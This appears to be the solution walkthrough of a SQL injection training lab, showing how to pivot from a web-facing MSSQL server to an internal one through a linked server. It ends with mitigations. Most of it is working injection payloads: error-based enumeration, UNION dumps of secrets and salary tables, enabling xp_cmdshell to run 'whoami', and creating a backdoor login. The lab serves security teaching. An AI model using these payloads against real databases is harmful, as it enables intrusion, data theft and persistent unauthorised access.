<h4>Architecture</h4>
<p>
    This lab uses <strong>two real, separate MSSQL servers</strong> running in different Docker containers:
</p>
<ul>
    <li><strong>Server A</strong> (<code>sqli-arena-mssql</code>) &mdash; the web-facing database with <code>customers</code> and <code>flags</code> tables</li>
    <li><strong>Server B</strong> (<code>sqli-arena-mssql-internal</code>) &mdash; an internal database with <code>secrets</code>, <code>internal_users</code>, and <code>salary_data</code> tables</li>
</ul>
<p>
    Server A has a linked server (<code>INTERNAL_DB_SRV</code>) configured to connect to Server B
    using sysadmin credentials. The web application only connects to Server A &mdash; but through
    SQL injection, you can pivot across the linked server to reach Server B.
</p>

<h4>Step 1: Test Normal Customer Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=John"<br><br>
        <span class="prompt">Input: </span>John<br>
        <span class="prompt">SQL: </span>SELECT id, name, email FROM customers WHERE name LIKE '%John%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>John Smith</strong> &bull; john.smith@example.com<br>
        <strong>Bob Johnson</strong> &bull; bob.johnson@example.com
    </div>
</div>

<h4>Step 2: Confirm Injection and Enumerate</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error-Based Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Trigger a syntax error to confirm injection:</span><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>Unclosed quotation mark after the character string '%'%'.</strong><br><br>

        <span class="prompt">// Extract database name via CONVERT error:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, DB_NAME()) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'sqli_arena_mssql_lab13' to data type int.</strong><br><br>

        <span class="prompt">// Enumerate all tables in the current database:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(TABLE_NAME, ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'customers,flags' to data type int.</strong>
    </div>
</div>

<h4>Step 3: Extract the Local Flag (Server A)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Flag Extraction from Server A</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the varchar value 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}' to data type int.</strong><br><br>
        <span class="prompt">Flag: </span><code>FLAG{ms_l1nk3d_s3rv3r_p1v0t}</code>
    </div>
</div>

<h4>Step 4: Discover Linked Servers</h4>
<p>MSSQL stores linked server configuration in <code>sys.servers</code>. Enumerate to find pivot targets:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Linked Server Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List all linked servers:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'INTERNAL_DB_SRV' to data type int.</strong><br><br>

        <span class="prompt">// Get the remote server address:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 data_source FROM sys.servers WHERE name='INTERNAL_DB_SRV')) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'sqli-arena-mssql-internal' to data type int.</strong><br><br>

        <span class="prompt">Found: </span>Linked server <code>INTERNAL_DB_SRV</code> pointing to a separate MSSQL instance!
    </div>
</div>

<h4>Step 5: Enumerate Server B via OPENQUERY</h4>
<p>Use <code>OPENQUERY()</code> to run queries on the remote linked server and discover its databases and tables:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Server B Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List databases on Server B:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(name, ',') FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT name FROM sys.databases WHERE database_id > 4'))) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'sqli_arena_internal_db' to data type int.</strong><br><br>

        <span class="prompt">// List tables on Server B:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, TABLE_NAME, 'x' FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT TABLE_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.TABLES') -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>secrets</strong><br>
        <strong>internal_users</strong><br>
        <strong>salary_data</strong><br><br>

        <span class="prompt">// List columns in the secrets table:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT COLUMN_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=''secrets'''))) -- -<br>
        <span class="prompt">Error: </span><strong>Conversion failed when converting the nvarchar value 'id,secret_name,secret_value,classification' to data type int.</strong>
    </div>
</div>

<h4>Step 6: Extract Secrets from Server B</h4>
<p>Use four-part naming (<code>[SERVER].[DB].[SCHEMA].[TABLE]</code>) to directly query Server B:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Secret Extraction from Server B</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>' UNION SELECT id, secret_name, secret_value FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[secrets] -- -<br><br>
        <span class="prompt">Output:</span><br>
        <strong>API Master Key</strong> &bull; sk-prod-9f8e7d6c5b4a3210<br>
        <strong>Database Root Password</strong> &bull; S3rv3rB_R00t_P@ss!<br>
        <strong>Encryption Key</strong> &bull; aes256-0xDEADBEEF42<br>
        <strong>Internal Flag</strong> &bull; FLAG{p1v0t3d_t0_s3rv3r_B!}
    </div>
</div>

<h4>Step 7: Exfiltrate Internal Users and Salary Data</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Full Server B Compromise</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Internal users via OPENQUERY:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, username, role FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT username, role FROM sqli_arena_internal_db.dbo.internal_users') -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>svc_backup</strong> &bull; service_account<br>
        <strong>admin_intern</strong> &bull; admin<br>
        <strong>db_admin</strong> &bull; dba<br>
        <strong>cfo_account</strong> &bull; executive<br><br>

        <span class="prompt">// Salary data via four-part naming:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, employee, CAST(salary AS VARCHAR) FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[salary_data] -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>CEO</strong> &bull; 450000.00<br>
        <strong>CFO</strong> &bull; 320000.00<br>
        <strong>CTO</strong> &bull; 340000.00<br>
        <strong>CISO</strong> &bull; 280000.00
    </div>
</div>

<h4>Step 8: Remote Command Execution via EXEC AT</h4>
<p>With RPC enabled on the linked server, <code>EXEC ... AT</code> runs statements directly on Server B:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. EXEC AT Linked Server</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Execute arbitrary SQL on Server B:</span><br>
        <span class="prompt">Input: </span>'; EXEC('SELECT @@SERVERNAME') AT INTERNAL_DB_SRV; -- -<br><br>
        <span class="prompt">// Enable and run xp_cmdshell on Server B:</span><br>
        <span class="prompt">Input: </span>'; EXEC('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT INTERNAL_DB_SRV; -- -<br>
        <span class="prompt">Input: </span>'; EXEC('EXEC xp_cmdshell ''whoami''') AT INTERNAL_DB_SRV; -- -<br><br>
        <span class="prompt">// Create a backdoor login on Server B:</span><br>
        <span class="prompt">Input: </span>'; EXEC('CREATE LOGIN backdoor WITH PASSWORD=''Pwn3d!''') AT INTERNAL_DB_SRV; -- -
    </div>
</div>

<h4>Step 9: Submit the Flag</h4>
<p>
    Submit the local flag: <code>FLAG{ms_l1nk3d_s3rv3r_p1v0t}</code>
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Full Exploit Chain Summary</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// 1. Extract local flag from Server A</span><br>
        <span class="prompt">$ </span>curl -s "http://sqli-arena.local/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br>
        <span class="prompt">Flag: </span><strong>FLAG{ms_l1nk3d_s3rv3r_p1v0t}</strong><br><br>

        <span class="prompt">// 2. Discover linked server</span><br>
        <span class="prompt">$ </span>curl -s "http://sqli-arena.local/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -"<br>
        <span class="prompt">Found: </span><strong>INTERNAL_DB_SRV</strong> &rarr; sqli-arena-mssql-internal<br><br>

        <span class="prompt">// 3. Pivot to Server B and dump all secrets</span><br>
        <span class="prompt">$ </span>curl -s "http://sqli-arena.local/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' UNION SELECT id, secret_name, secret_value FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[secrets] -- -"<br>
        <span class="prompt">Secrets: </span><strong>API Master Key</strong> | <strong>Database Root Password</strong> | <strong>Encryption Key</strong> | <strong>FLAG{p1v0t3d_t0_s3rv3r_B!}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> This lab uses two separate MSSQL server instances connected via a linked
    server. A single SQL injection vulnerability on Server A allowed pivoting to a completely different
    database server (Server B) using <code>OPENQUERY()</code>, four-part naming
    (<code>[SERVER].[DB].[SCHEMA].[TABLE]</code>), and <code>EXEC ... AT</code>.
    <strong>Mitigations:</strong> Remove unnecessary linked servers, use minimal-privilege accounts for
    linked server mappings (never sysadmin), restrict <code>OPENQUERY</code> permissions, and
    disable RPC on linked servers that don't require it.
</div>
